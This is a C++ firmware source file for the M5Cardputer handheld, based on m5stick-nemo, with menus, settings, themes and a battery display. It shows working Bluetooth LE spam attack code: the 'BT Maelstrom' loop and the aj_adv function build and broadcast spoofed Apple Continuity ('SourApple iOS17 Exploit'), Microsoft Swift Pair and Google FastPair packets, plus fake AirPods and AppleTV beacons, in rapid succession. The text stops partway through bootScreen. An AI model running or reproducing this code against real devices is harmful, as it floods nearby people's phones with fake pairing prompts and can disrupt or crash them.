// M5-ctOS Firmware for M5Cardputer
// based on m5stick-nemo by n0xa | github.com/n0xa

#define CARDPUTER
#define LANGUAGE_EN_US

uint16_t BGCOLOR=0x0001; // placeholder
uint16_t FGCOLOR=0xFFF1; // placeholder

#ifndef NEMO_VERSION
  #define NEMO_VERSION "dev"
#endif

#include <M5Cardputer.h>
// -=-=- Display -=-=-
String platformName="Cardputer";
#define BIG_TEXT 4
#define MEDIUM_TEXT 3
#define SMALL_TEXT 2
#define TINY_TEXT 1
// -=-=- FEATURES -=-=-
#define KB
#define HID
#define ACTIVE_LOW_IR
#define USE_EEPROM
#define SDCARD
// -=-=- ALIASES -=-=-
#define DISP M5Cardputer.Display
#define IRLED 44
#define BACKLIGHT 38
#define MINBRIGHT 165
#define SPEAKER M5Cardputer.Speaker
#define BITMAP M5Cardputer.Display.drawBmp(WatchDogsMatrix, 97254)
#define SD_CLK_PIN 40
#define SD_MISO_PIN 39
#define SD_MOSI_PIN 14
#define SD_CS_PIN 12
#define VBAT_PIN 10
#define M5LED_ON LOW
#define M5LED_OFF HIGH

/// SWITCHER ///
// Proc codes
// 1  - Main Menu
// 2  - Settings Menu
// 4  - Dimmer Time adjustment
// 6  - Battery info
// 8  - AppleJuice Menu
// 9  - AppleJuice Advertisement
// 10 - Credits/About
// 16 - Mobile Devices Menu
// 17 - Bluetooth Maelstrom
// 22 - Custom Color Settings
// 23 - Pre-defined color themes

const String contributors[] PROGMEM = {
  "@bicurico",
  "@bmorcelli",
  "@chr0m1ng",
  "@doflamingozk",
  "@9Ri7",
  "@gustavocelani",
  "@imxnoobx",
  "@klamath1977",
  "@marivaaldo",
  "@mmatuda",
  "@n0xa",
  "@niximkk",
  "@unagironin",
  "@vladimirpetrov",
  "@vs4vijay"
};

int advtime = 0;
int cursor = 0;
int brightness = 100;
int rotation = 1;
int ajDelay = 1000;
bool rstOverride = false;   // Reset Button Override. Set to true when navigating menus.
bool sourApple = false;     // Internal flag to place AppleJuice into SourApple iOS17 Exploit Mode
bool swiftPair = false;     // Internal flag to place AppleJuice into Swift Pair random packet Mode
bool androidPair = false;   // Internal flag to place AppleJuice into Android Pair random packet Mode
bool maelstrom = false;     // Internal flag to place AppleJuice into Bluetooth Maelstrom mode
bool isSwitching = true;
int current_proc = 1; // Start in Main Menu

#include <EEPROM.h>
#define EEPROM_SIZE 64
#include "applejuice.h"
#include "WatchDogsMatrix.h"
#include "localization.h"
#include <BLEUtils.h>
#include <BLEServer.h>
#include <WiFi.h>
#include <WiFiClientSecure.h>
#include <HTTPClient.h>
#include <Preferences.h>
#include <ArduinoJson.h>
struct MENU {
  char name[19];
  int command;
};

void drawmenu(MENU thismenu[], int size) {
  DISP.setTextSize(SMALL_TEXT);
  DISP.fillScreen(BGCOLOR);
  DISP.setCursor(0, 0, 1);
  // scrolling menu
  if (cursor < 0) {
    cursor = size - 1;  // rollover hack for up-arrow on cardputer  
  }
  if (cursor > 5) {
    for ( int i = 0 + (cursor - 5) ; i < size ; i++ ) {
      if(cursor == i){
        DISP.setTextColor(BGCOLOR, FGCOLOR);
      }
      DISP.printf(" %-19s\n",thismenu[i].name);
      DISP.setTextColor(FGCOLOR, BGCOLOR);
    }
  } else {
    for (
      int i = 0 ; i < size ; i++ ) {
      if(cursor == i){
        DISP.setTextColor(BGCOLOR, FGCOLOR);
      }
      DISP.printf(" %-19s\n",thismenu[i].name);
      DISP.setTextColor(FGCOLOR, BGCOLOR);
    }
  }
}

void number_drawmenu(int nums) {
  DISP.setTextSize(SMALL_TEXT);
  DISP.fillScreen(BGCOLOR);
  DISP.setCursor(0, 0);
  // scrolling menu
  if (cursor > 5) {
    for ( int i = 0 + (cursor - 5) ; i < nums ; i++ ) {
      if(cursor == i){
        DISP.setTextColor(BGCOLOR, FGCOLOR);
      }
      DISP.printf(" %-19d\n",i);
      DISP.setTextColor(FGCOLOR, BGCOLOR);
    }
  } else {
    for (
      int i = 0 ; i < nums ; i++ ) {
      if(cursor == i){
        DISP.setTextColor(BGCOLOR, FGCOLOR);
      }
      DISP.printf(" %-19d\n",i);
      DISP.setTextColor(FGCOLOR, BGCOLOR);
    }
  }
}

void switcher_button_proc() {
  if (rstOverride == false && !isSwitching) {
    if (check_next_press()) {
      isSwitching = true;
      current_proc = 1;
    }
  }
}

// Tap the power button from pretty much anywhere to get to the main menu
void check_menu_press() {
  if (M5Cardputer.Keyboard.isKeyPressed(',') || M5Cardputer.Keyboard.isKeyPressed('`')){
    dimtimer();
    isSwitching = true;
    rstOverride = false;
    current_proc = 1;
    delay(100);
  }
}

bool check_next_press(){
  M5Cardputer.update();
  if (M5Cardputer.Keyboard.isKeyPressed(';')){
    cursor = cursor - 2; // handle up arrow
    dimtimer();
    return true;
  }
  if (M5Cardputer.Keyboard.isKeyPressed(KEY_TAB) || M5Cardputer.Keyboard.isKeyPressed('.')){
    dimtimer();
    return true;
  }
  return false;
}

bool check_select_press(){
  M5Cardputer.update();
  if (M5Cardputer.Keyboard.isKeyPressed(KEY_ENTER) || M5Cardputer.Keyboard.isKeyPressed('/')){
    dimtimer();
    return true;
  }
  return false;
}

// Unified Menu Controller
class MenuController {
private:
  MENU* currentMenu;
  int menuSize;
  void (*onExit)();
  void (*onSelect)();
  
public:
  void setup(MENU* menu, int size, void (*exitCallback)() = nullptr, void (*selectCallback)() = nullptr) {
    currentMenu = menu;
    menuSize = size;
    onExit = exitCallback;
    onSelect = selectCallback;
    cursor = 0;
    rstOverride = true;  // Always disable switcher when menu is active
    drawmenu(currentMenu, menuSize);
    delay(500); // Prevent switching after menu loads up
  }
  
  // Special setup with initial screen display
  void setupWithIntro(MENU* menu, int size, String introText, int introDelay = 1000) {
    DISP.fillScreen(BGCOLOR);
    DISP.setCursor(0, 0);
    DISP.println(introText);
    delay(introDelay);
    setup(menu, size);
  }
  
  void loop() {
    if (check_next_press()) {
      cursor++;
      cursor = cursor % menuSize;
      drawmenu(currentMenu, menuSize);
      delay(250);
    }
    if (check_select_press()) {
      if (onSelect) {
        onSelect(); // Custom selection handler
        // Custom callbacks may set rstOverride=false to exit, but if still in menu, restore it
        if (!isSwitching) {
          rstOverride = true;
        }
      } else {
        // Default selection behavior - always allow exit
        rstOverride = false;
        if (onExit) {
          onExit();
        }
        isSwitching = true;
        current_proc = currentMenu[cursor].command;
      }
    }
  }
  
  // Special loop for number menus
  void numberLoop(int maxNum) {
    if (check_next_press()) {
      cursor++;
      cursor = cursor % maxNum;
      number_drawmenu(maxNum);
      delay(250);
    }
    if (check_select_press()) {
      rstOverride = false;
      isSwitching = true;
      current_proc = 1; // Usually goes back to main menu
    }
  }
};

// Global menu controller instance
MenuController menuController;

/// MAIN MENU ///
MENU mmenu[] = {
  { "Mobile Devices", 16},
  { "Wi-Fi Config",   20},
  { "Ather",          30},
  { TXT_SETTINGS,      2},
};
int mmenu_size = sizeof(mmenu) / sizeof(MENU);

void mmenu_setup() {
  menuController.setup(mmenu, mmenu_size);
}

bool screen_dim_dimmed = false;
int screen_dim_time = 30;
int screen_dim_current = 0;

void screenBrightness(int bright){
  Serial.printf("Brightness: %d\n", bright);
  int bl = MINBRIGHT + round(((255 - MINBRIGHT) * bright / 100));
  analogWrite(BACKLIGHT, bl);
}

int uptime(){
  return(int(millis() / 1000));
}

void dimtimer(){
  if(screen_dim_dimmed){
    screenBrightness(brightness);
    screen_dim_dimmed = false;
  }
  screen_dim_current = uptime() + screen_dim_time + 2;
}

void screen_dim_proc() {
  if(screen_dim_time > 0){
    if (screen_dim_dimmed == false) {
      if (uptime() == screen_dim_current || (uptime() + 1) == screen_dim_current || (uptime() + 2) == screen_dim_current) {
        screenBrightness(0);
        screen_dim_dimmed = true;
      }
    }
  }
}

/// Dimmer MENU ///
MENU dmenu[] = {
  { TXT_BACK, screen_dim_time},
  { TXT_NEVER, 0},
  { ("5 " TXT_SEC), 5},
  { ("10 " TXT_SEC), 10},
  { ("15 " TXT_SEC), 15},
  { ("30 " TXT_SEC), 30},
  { ("60 " TXT_SEC), 60},
  { ("120 " TXT_MIN), 120},
  { ("240 " TXT_MIN), 240},
};
int dmenu_size = sizeof(dmenu) / sizeof(MENU);

// Custom callback for dmenu selection
void dmenu_onSelect() {
  screen_dim_time = dmenu[cursor].command;
  #if defined(USE_EEPROM)
    EEPROM.write(1, screen_dim_time);
    EEPROM.commit();
  #endif
  DISP.fillScreen(BGCOLOR);
  DISP.setCursor(0, 0);
  DISP.println(String(TXT_SET_BRIGHT));
  delay(1000);
  cursor = brightness / 10;
  number_drawmenu(11);
  while( !check_select_press()) {
    if (check_next_press()) {
      cursor++;
      cursor = cursor % 11 ;
      number_drawmenu(11);
      screenBrightness(10 * cursor);
      delay(250);
     }
  }
  screenBrightness(10 * cursor);
  brightness = 10 * cursor;
  #if defined(USE_EEPROM)
    EEPROM.write(2, brightness);
    EEPROM.commit();
  #endif
  rstOverride = false;
  isSwitching = true;
  current_proc = 2;
}

void dmenu_setup() {
  DISP.fillScreen(BGCOLOR);
  DISP.setCursor(0, 0);
  DISP.println(String(TXT_AUTO_DIM));
  delay(1000);
  menuController.setup(dmenu, dmenu_size, nullptr, dmenu_onSelect);
}

/// SETTINGS MENU ///
MENU smenu[] = {
  { TXT_BACK, 1},
  { TXT_BATT_INFO, 6},
  { TXT_BRIGHT, 4},
  { TXT_THEME, 23},
  { TXT_ABOUT, 10},
  { TXT_REBOOT, 98},
  { TXT_CLR_SETTINGS, 99},
};

int smenu_size = sizeof(smenu) / sizeof (MENU);

// Custom callback for smenu selection
void smenu_onSelect() {
  if(smenu[cursor].command == 98){
    rstOverride = false;
    ESP.restart();
  }
  else if(smenu[cursor].command == 99){
    rstOverride = false;
    clearSettings();
  }
  else {
    // Normal menu navigation - don't disable rstOverride
    rstOverride = false;
    isSwitching = true;
    current_proc = smenu[cursor].command;
  }
}

void smenu_setup() {
  menuController.setup(smenu, smenu_size, nullptr, smenu_onSelect);
}

void clearSettings(){
  #if defined(USE_EEPROM)
  for(int i = 0; i < EEPROM_SIZE; i++) {
    EEPROM.write(i, 255);
    Serial.printf("clearing byte %d\n", i);
  }
  EEPROM.commit();
  #endif
  screenBrightness(100);
  DISP.fillScreen(BLUE);
  DISP.setTextSize(BIG_TEXT);
  DISP.setRotation(1);
  DISP.setTextColor(BLUE, WHITE);
  DISP.setCursor(40, 0);
  DISP.println("M5-NEMO");
  DISP.setTextColor(WHITE, BLUE);
  DISP.setTextSize(SMALL_TEXT);
  DISP.println(TXT_CLRING_SETTINGS);
  delay(5000);
  ESP.restart();
}

MENU cmenu[] = {
  { TXT_BACK, 0},
  { TXT_BLACK, 1},
  { TXT_NAVY, 2},
  { TXT_DARKGREEN, 3},
  { TXT_DARKCYAN, 4},
  { TXT_MAROON, 5},
  { TXT_PURPLE, 6},
  { TXT_OLIVE, 7},
  { TXT_LIGHTGREY, 8},
  { TXT_DARKGREY, 9},
  { TXT_BLUE, 10},
  { TXT_GREEN, 11},
  { TXT_CYAN, 12},
  { TXT_RED, 13},
  { TXT_MAGENTA, 14},
  { TXT_YELLOW, 15},
  { TXT_WHITE, 16},
  { TXT_ORANGE, 17},
  { TXT_GREENYELLOW, 18},
  { TXT_PINK, 19},
};
int cmenu_size = sizeof(cmenu) / sizeof (MENU);

void setcolor(bool fg, int col){
  uint16_t color = 0x0000;
  switch (col){
    case 1:
      color=0x0000;
      break; 
    case 2:
      color=0x000F;
      break;
    case 3:
      color=0x03E0;
      break;
    case 4:
      color=0x03EF;
      break;
    case 5:
      color=0x7800;
      break;
    case 6:
      color=0x780F;
      break;
    case 7:
      color=0x7BE0;
      break;
    case 8:
      color=0xC618;
      break;
    case 9:
      color=0x7BEF;
      break;
    case 10:
      color=0x001F;
      break;
    case 11:
      color=0x07E0;
      break;
    case 12:
      color=0x07FF;
      break;
    case 13:
      color=0xF800;
      break;
    case 14:
      color=0xF81F;
      break;
    case 15:
      color=0xFFE0;
      break;
    case 16:
      color=0xFFFF;
      break;
    case 17:
      color=0xFDA0;
      break;
    case 18:
      color=0xB7E0;
      break;
    case 19:
      color=0xFC9F;
      break;
  }
  if(fg){
    FGCOLOR=color;
  }else{
    BGCOLOR=color;
  }
  if(FGCOLOR == BGCOLOR){
    BGCOLOR = FGCOLOR ^ 0xFFFF;
  }
  DISP.setTextColor(FGCOLOR, BGCOLOR);
}

void color_setup() {
  DISP.fillScreen(BGCOLOR);
  DISP.setCursor(0, 0);
  DISP.println(String(TXT_SET_FGCOLOR));
  cursor = 0;
  #if defined(USE_EEPROM)
    cursor=EEPROM.read(4); // get current fg color
  #endif
  rstOverride = true;
  delay(1000);  
  drawmenu(cmenu, cmenu_size);
}

void color_loop() {
  if (check_next_press()) {
    setcolor(EEPROM.read(5), false);
    cursor++;
    cursor = cursor % cmenu_size;
    setcolor(true, cursor);
    drawmenu(cmenu, cmenu_size);
    delay(250);
  }
  if (check_select_press()) {
    #if defined(USE_EEPROM)
      Serial.printf("EEPROM WRITE (4) FGCOLOR: %d\n", cursor);
      EEPROM.write(4, cursor);
      EEPROM.commit();
      cursor=EEPROM.read(5); // get current bg color
    #endif
    DISP.fillScreen(BGCOLOR);
    DISP.setCursor(0, 0);
    DISP.println(String(TXT_SET_BGCOLOR));
    delay(1000);
    setcolor(false, cursor);
    drawmenu(cmenu, cmenu_size);
    while( !check_select_press()) {
      if (check_next_press()) {
        cursor++;
        cursor = cursor % cmenu_size ;
        setcolor(false, cursor);
        drawmenu(cmenu, cmenu_size);
        delay(250);
       }
    }
    #if defined(USE_EEPROM)
      Serial.printf("EEPROM WRITE (5) BGCOLOR: %d\n", cursor);
      EEPROM.write(5, cursor);
      EEPROM.commit();
    #endif
    rstOverride = false;
    isSwitching = true;
    current_proc = 2;
  }
}

MENU thmenu[] = {
  { TXT_BACK, 0},
  { "Nemo", 1},
  { "Tux", 2},
  { "Bill", 3},
  { "Steve", 4},
  { "Lilac", 5},
  { "Contrast", 6},
  { "NightShift", 7},
  { "Camo", 8},
  { "BubbleGum", 9},
  { TXT_COLOR, 99},
};
int thmenu_size = sizeof(thmenu) / sizeof (MENU);

void theme_setup() {
  DISP.fillScreen(BGCOLOR);
  DISP.setCursor(0, 0);
  DISP.println(String(TXT_THEME));
  cursor = 0;
  rstOverride = true;
  delay(1000);  
  drawmenu(thmenu, thmenu_size);
}

int BG=0;
int FG=0;

void theme_loop() {
  if (check_next_press()) {
    cursor++;
    cursor = cursor % thmenu_size;
    switch (thmenu[cursor].command){
      case 0:
        FG=11;
        BG=1;
        break;       
      case 1: // Nemo
        FG=11;
        BG=1;
        break;
      case 2: // Tux
        FG=8;
        BG=1;
        break;  
      case 3: // Bill
        FG=16;
        BG=10;
        break;
      case 4: // Steve
        FG=1;
        BG=8;
        break;        
      case 5: // Lilac
        FG=19;
        BG=6;
        break;
      case 6: // Contrast
        FG=16;
        BG=1;
        break;
      case 7: // NightShift
        FG=5;
        BG=1;
         break;
      case 8: // Camo
        FG=1;
        BG=7;
        break;
      case 9: // BubbleGum
        FG=1;
        BG=19;
        break;
      case 99:
        FG=11;
        BG=1;
        break;
     }
    setcolor(true, FG);
    setcolor(false, BG);
    drawmenu(thmenu, thmenu_size);
    delay(250);
  }
  if (check_select_press()) {
    switch (thmenu[cursor].command){
      case 99:
        rstOverride = false;
        isSwitching = true;
        current_proc = 22;
        break;
      case 0:
        #if defined(USE_EEPROM)
          setcolor(true, EEPROM.read(4));
          setcolor(false, EEPROM.read(5));
        #endif
        rstOverride = false;
        isSwitching = true;
        current_proc = 2;
        break;
      default:
        #if defined(USE_EEPROM)
          Serial.printf("EEPROM WRITE (4) FGCOLOR: %d\n", FG);
          EEPROM.write(4, FG);
          Serial.printf("EEPROM WRITE (5) BGCOLOR: %d\n", BG);
          EEPROM.write(5, BG);
          EEPROM.commit();
        #endif
        rstOverride = false;
        isSwitching = true;
        current_proc = 2;
    }
  }
}

/// BATTERY INFO ///

// Get battery color based on percentage
uint16_t getBatteryColor(int battery) {
  if(battery < 20) {
    return RED;
  } else if(battery < 60) {
    return ORANGE;
  } else {
    return GREEN;
  }
}

void battery_drawmenu(int battery, float voltage_b = 0, float voltage_c = 0) {
  DISP.fillScreen(BGCOLOR);
  
  // Get battery bar color
  uint16_t batteryColor = getBatteryColor(battery);
  
  int barX = 10, barY = 20, barW = 220, barH = 40;
  int textX = 100, textY = 70;
  int exitY = 120;
  int textSize = BIG_TEXT;

  // Draw battery outline
  DISP.drawRect(barX, barY, barW, barH, batteryColor);
  
  // Draw battery fill
  int fillW = (barW - 4) * battery / 100;
  if (fillW > 0) {
    DISP.fillRect(barX + 2, barY + 2, fillW, barH - 4, batteryColor);
  }
  
  // Draw battery terminal (small rectangle on right)
  DISP.drawRect(barX + barW, barY + barH/4, 3, barH/2, batteryColor);
  DISP.fillRect(barX + barW, barY + barH/4, 3, barH/2, batteryColor);
  
  // Draw percentage text
  DISP.setTextColor(FGCOLOR, BGCOLOR);
  DISP.setTextSize(textSize);
  DISP.setCursor(textX, textY, 1);
  DISP.print(battery);
  DISP.println("%");
    
  // Exit instruction
  DISP.setTextSize(TINY_TEXT);
  DISP.setCursor(10, exitY, 1);
  DISP.println(TXT_EXIT);
  DISP.setTextColor(FGCOLOR, BGCOLOR);
}

uint8_t oldBattery = 0;

void battery_setup() {
  rstOverride = false;
  pinMode(VBAT_PIN, INPUT);
  uint8_t battery = ((((analogRead(VBAT_PIN)) - 1842) * 100) / 738);
  battery_drawmenu(battery);
  delay(500);
}

void battery_loop() {
  uint16_t batteryValues = 0;
  for(uint8_t i = 0; i < 30; i++) {
    delay(100);
    batteryValues += ((((analogRead(VBAT_PIN)) - 1842) * 100) / 738);
    M5Cardputer.update();
    if(M5Cardputer.Keyboard.isChange() && M5Cardputer.Keyboard.isPressed()) {
      rstOverride = false;
      isSwitching = true;
      current_proc = 1;
      break;
    }
  }
  if(!isSwitching) {
    uint8_t battery = batteryValues / 30;
    if(battery != oldBattery) {
      oldBattery = battery;
      battery_drawmenu(battery);
    }
  }
}

/// Mobile Devices Menu ///
MENU mobiledevices_menu[] = {
  { TXT_BACK, 5},
  { "BT Maelstrom", 3},
};
int mobiledevices_size = sizeof(mobiledevices_menu) / sizeof(MENU);

void mobiledevices_setup() {
  cursor = 0;
  sourApple = false;
  swiftPair = false;
  maelstrom = false;
  androidPair = false;
  rstOverride = true;
  drawmenu(mobiledevices_menu, mobiledevices_size);
  delay(500); // Prevent switching after menu loads up
}

void mobiledevices_loop() {
  if (check_next_press()) {
    cursor++;
    cursor = cursor % mobiledevices_size;
    drawmenu(mobiledevices_menu, mobiledevices_size);
    delay(250);
  }
  if (check_select_press()) {
    int option = mobiledevices_menu[cursor].command;
    DISP.fillScreen(BGCOLOR);
    DISP.setTextSize(MEDIUM_TEXT);
    DISP.setCursor(0, 0);
    DISP.setTextColor(BGCOLOR, FGCOLOR);
    DISP.printf(" %-12s\n", "Mobile Devices");
    DISP.setTextColor(FGCOLOR, BGCOLOR);
    DISP.setTextSize(SMALL_TEXT);

    switch(option) {
      case 3:
        rstOverride = false;
        isSwitching = true;
        current_proc = 17;
        DISP.print("BT Maelstrom\n");
        DISP.print(TXT_CMB_BT_SPAM);
        DISP.print(TXT_SEL_EXIT2);
        break;
      case 5:
        DISP.fillScreen(BGCOLOR);
        rstOverride = false;
        isSwitching = true;
        current_proc = 1;
        break;
    }
  }
}

MENU ajmenu[] = {
  { TXT_BACK, 30},
  { "AirPods", 1},
  { TXT_AJ_TRANSF_NM, 27},
  { "AirPods Pro", 2},
  { "AirPods Max", 3},
  { "AirPods G2", 4},
  { "AirPods G3", 5},
  { "AirPods Pro G2", 6},
  { "PowerBeats", 7},
  { "PowerBeats Pro", 8},
  { "Beats Solo Pro", 9},
  { "Beats Studio Buds", 10},
  { "Beats Flex", 11},
  { "Beats X", 12},
  { "Beats Solo 3", 13},
  { "Beats Studio 3", 14},
  { "Beats Studio Pro", 15},
  { "Beats Fit Pro", 16},
  { "Beats Studio Buds+", 17},
  { "Apple Vision Pro", 29},
  { "AppleTV Setup", 18},
  { "AppleTV Pair", 19},
  { "AppleTV New User", 20},
  { "AppleTV AppleID", 21},
  { "AppleTV Audio", 22},
  { "AppleTV HomeKit", 23},
  { "AppleTV Keyboard", 24},
  { "AppleTV Network", 25},
  { TXT_AJ_TV_COLOR, 26},
  { TXT_STP_NW_PH, 28},
};
int ajmenu_size = sizeof(ajmenu) / sizeof (MENU);

void aj_setup(){
  DISP.fillScreen(BGCOLOR);
  DISP.setTextSize(MEDIUM_TEXT);
  DISP.setCursor(0, 0);
  DISP.setTextColor(BGCOLOR, FGCOLOR);
  DISP.println(" AppleJuice  ");
  DISP.setTextColor(FGCOLOR, BGCOLOR);
  delay(1000);  
  cursor = 0;
  sourApple = false;
  swiftPair = false;
  maelstrom = false;
  rstOverride = true;
  drawmenu(ajmenu, ajmenu_size);
}

void aj_loop(){
  if (!maelstrom){
    if (check_next_press()) {
      cursor++;
      cursor = cursor % ajmenu_size;
      drawmenu(ajmenu, ajmenu_size);
      delay(100);
    }
  }
  if (check_select_press() || maelstrom) {
    deviceType = ajmenu[cursor].command;
    if (maelstrom) {
      deviceType = random(1, 28);
    }
    switch(deviceType) {
      case 1:
        data = Airpods;
        break;
      case 2:
        data = AirpodsPro;
        break;
      case 3:
        data = AirpodsMax;
        break;
      case 4:
        data = AirpodsGen2;
        break;
      case 5:
        data = AirpodsGen3;
        break;
      case 6:
        data = AirpodsProGen2;
        break;
      case 7:
        data = PowerBeats;
        break;
      case 8:
        data = PowerBeatsPro;
        break;
      case 9:
        data = BeatsSoloPro;
        break;
      case 10:
        data = BeatsStudioBuds;
        break;
      case 11:
        data = BeatsFlex;
        break;
      case 12:
        data = BeatsX;
        break;
      case 13:
        data = BeatsSolo3;
        break;
      case 14:
        data = BeatsStudio3;
        break;
      case 15:
        data = BeatsStudioPro;
        break;
      case 16:
        data = BeatsFitPro;
        break;
      case 17:
        data = BeatsStudioBudsPlus;
        break;
      case 18:
        data = AppleTVSetup;
        break;
      case 19:
        data = AppleTVPair;
        break;
      case 20:
        data = AppleTVNewUser;
        break;
      case 21:
        data = AppleTVAppleIDSetup;
        break;
      case 22:
        data = AppleTVWirelessAudioSync;
        break;
      case 23:
        data = AppleTVHomekitSetup;
        break;
      case 24:
        data = AppleTVKeyboard;
        break;
      case 25:
        data = AppleTVConnectingToNetwork;
        break;
      case 26:
        data = TVColorBalance;
        break;
      case 27:
        data = TransferNumber;
        break;
      case 28:
        data = SetupNewPhone;
        break;
      case 29:
        data = AppleVisionPro;
        break;
      case 30:
        rstOverride = false;
        isSwitching = true;
        current_proc = 1;
        break;
    }
    if (current_proc == 8 && isSwitching == false){
      DISP.fillScreen(BGCOLOR);
      DISP.setTextSize(MEDIUM_TEXT);
      DISP.setCursor(0, 0);
      DISP.setTextColor(BGCOLOR, FGCOLOR);
      DISP.println(" AppleJuice  ");
      DISP.setTextColor(FGCOLOR, BGCOLOR);
      DISP.setTextSize(SMALL_TEXT);
      DISP.print(TXT_ADV);
      DISP.print(ajmenu[cursor].name);
      DISP.print(TXT_SEL_EXIT2);
      isSwitching = true;
      current_proc = 9; // Jump over to the AppleJuice BLE beacon loop
    }
  }
}

char* generateRandomName() {
  static const char* names[] = {
    "Galaxy Buds Pro", "WH-1000XM5", "JBL Flip 6",
    "Pixel Buds Pro", "Bose QC45", "AirPods Max",
    "Surface Headphones", "Jabra Elite 85t", "Beats Studio3",
    "Anker Soundcore Q45", "Sony WF-1000XM4", "Razer Barracuda"
  };
  return strdup(names[rand() % (sizeof(names) / sizeof(names[0]))]);
}

void aj_adv_setup(){
  rstOverride = false;
}

void aj_adv(){
  // run the advertising loop
  // Isolating this to its own process lets us take advantage 
  // of the background stuff easier (menu button, dimmer, etc)
  rstOverride = true;
  if (sourApple || swiftPair || androidPair || maelstrom){
    delay(20);   // 20msec delay instead of ajDelay for SourApple attack
    advtime = 0; // bypass ajDelay counter
  }
  if (millis() > advtime + ajDelay){
    advtime = millis();
    pAdvertising->stop(); // This is placed here mostly for timing.
                          // It allows the BLE beacon to run through the loop.
    BLEAdvertisementData oAdvertisementData = BLEAdvertisementData();
    if (sourApple){
      Serial.print(TXT_SA_ADV);
      // Some code borrowed from RapierXbox/ESP32-Sour-Apple
      // Original credits for algorithm ECTO-1A & WillyJL
      uint8_t packet[17];
      uint8_t size = 17;
      uint8_t i = 0;
      packet[i++] = size - 1;    // Packet Length
      packet[i++] = 0xFF;        // Packet Type (Manufacturer Specific)
      packet[i++] = 0x4C;        // Packet Company ID (Apple, Inc.)
      packet[i++] = 0x00;        // ...
      packet[i++] = 0x0F;  // Type
      packet[i++] = 0x05;                        // Length
      packet[i++] = 0xC1;                        // Action Flags
      const uint8_t types[] = { 0x27, 0x09, 0x02, 0x1e, 0x2b, 0x2d, 0x2f, 0x01, 0x06, 0x20, 0xc0 };
      packet[i++] = types[rand() % sizeof(types)];  // Action Type
      esp_fill_random(&packet[i], 3); // Authentication Tag
      i += 3;
      packet[i++] = 0x00;  // ???
      packet[i++] = 0x00;  // ???
      packet[i++] =  0x10;  // Type ???
      esp_fill_random(&packet[i], 3);
      oAdvertisementData.addData(std::string((char *)packet, 17));
      for (int i = 0; i < sizeof packet; i ++) {
        Serial.printf("%02x", packet[i]);
      }
      Serial.println("");
    } else if (swiftPair) {
      const char* display_name = generateRandomName();
      Serial.printf(TXT_SP_ADV, display_name);
      uint8_t display_name_len = strlen(display_name);
      uint8_t size = 7 + display_name_len;
      uint8_t* packet = (uint8_t*)malloc(size);
      uint8_t i = 0;
      packet[i++] = size - 1; // Size
      packet[i++] = 0xFF; // AD Type (Manufacturer Specific)
      packet[i++] = 0x06; // Company ID (Microsoft)
      packet[i++] = 0x00; // ...
      packet[i++] = 0x03; // Microsoft Beacon ID
      packet[i++] = 0x00; // Microsoft Beacon Sub Scenario
      packet[i++] = 0x80; // Reserved RSSI Byte
      for (int j = 0; j < display_name_len; j++) {
        packet[i + j] = display_name[j];
      }
      for (int i = 0; i < size; i ++) {
        Serial.printf("%02x", packet[i]);
      }
      Serial.println("");

      i += display_name_len;  
      oAdvertisementData.addData(std::string((char *)packet, size));
      free(packet);
      free((void*)display_name);
    } else if (androidPair) {
      Serial.print(TXT_AD_SPAM_ADV);
      uint8_t packet[14];
      uint8_t i = 0;
      packet[i++] = 3;  // Packet Length
      packet[i++] = 0x03; // AD Type (Service UUID List)
      packet[i++] = 0x2C; // Service UUID (Google LLC, FastPair)
      packet[i++] = 0xFE; // ...
      packet[i++] = 6; // Size
      packet[i++] = 0x16; // AD Type (Service Data)
      packet[i++] = 0x2C; // Service UUID (Google LLC, FastPair)
      packet[i++] = 0xFE; // ...
      const uint32_t model = android_models[rand() % android_models_count].value; // Action Type
      packet[i++] = (model >> 0x10) & 0xFF;
      packet[i++] = (model >> 0x08) & 0xFF;
      packet[i++] = (model >> 0x00) & 0xFF;
      packet[i++] = 2; // Size
      packet[i++] = 0x0A; // AD Type (Tx Power Level)
      packet[i++] = (rand() % 120) - 100; // -100 to +20 dBm

      oAdvertisementData.addData(std::string((char *)packet, 14));
      for (int i = 0; i < sizeof packet; i ++) {
        Serial.printf("%02x", packet[i]);
      }
      Serial.println("");
    } else {
      Serial.print(TXT_AJ_ADV);
      if (deviceType >= 18){
        oAdvertisementData.addData(std::string((char*)data, sizeof(AppleTVPair)));
      } else {
        oAdvertisementData.addData(std::string((char*)data, sizeof(Airpods)));
      }
      for (int i = 0; i < sizeof(Airpods); i ++) {
        Serial.printf("%02x", data[i]);
      }      
      Serial.println("");
    }
    
    pAdvertising->setAdvertisementData(oAdvertisementData);
    pAdvertising->start();
  }
  if (check_next_press()) {
    if (sourApple || swiftPair || androidPair || maelstrom){
      isSwitching = true;
      current_proc = 16;
      drawmenu(mobiledevices_menu, mobiledevices_size);
    } else {
      isSwitching = true;
      current_proc = 8;      
      drawmenu(ajmenu, ajmenu_size);
    }
    sourApple = false;
    swiftPair = false;
    maelstrom = false;
    pAdvertising->stop(); // Bug that keeps advertising in the background. Oops.
    delay(250);
  }
}

/// CREDITS ///
void credits_setup(){
  DISP.fillScreen(WHITE);
  DISP.qrcode("https://github.com/n0xa/m5stick-nemo", 145, 22, 100, 5);
  DISP.setTextColor(BLACK, WHITE);
  DISP.setTextSize(MEDIUM_TEXT);
  DISP.setCursor(0, 10);
  DISP.print(" M5-NEMO\n");
  DISP.setTextSize(SMALL_TEXT);
  DISP.printf("  %s\n",NEMO_VERSION);
  DISP.println(" For M5Stack");
  DISP.printf(" %s\n\n", platformName);
  DISP.println("Contributors:");
  DISP.setCursor(155, 5);
  DISP.println("GitHub");
  DISP.setCursor(155, 17);
  DISP.println("Source:");
  delay(250);
  cursor = 0;
  advtime = 0;
}

void credits_loop(){
  if(millis() > advtime){
    DISP.setTextColor(BLACK, WHITE);  
    DISP.setCursor(0, 115);
    DISP.println("                   ");
    DISP.setCursor(0, 115);
    DISP.println(contributors[cursor]);
    cursor++;  
    cursor = cursor % (sizeof(contributors)/sizeof(contributors[0]));
    DISP.setTextColor(FGCOLOR, BGCOLOR);
    advtime=millis() + 2000;
  }
}

/// WiFiSPAM ///

void btmaelstrom_setup(){
  rstOverride = false;
  maelstrom = true;
}

void btmaelstrom_loop(){  
  swiftPair = false;
  sourApple = true;
  aj_adv();
  if (maelstrom){
    swiftPair = true;
    androidPair = false;
    sourApple = false;
    aj_adv();
  }
  if (maelstrom){
    swiftPair = false;
    androidPair = true;
    sourApple = false;
    aj_adv();
  }
  if (maelstrom){
    swiftPair = false;
    androidPair = false;
    sourApple = false;
    aj_loop(); // roll a random device ID
    aj_adv();
  }
}

void bootScreen(){
  BITMAP;
  delay(3000);
  DISP.fillScreen(BGCOLOR);
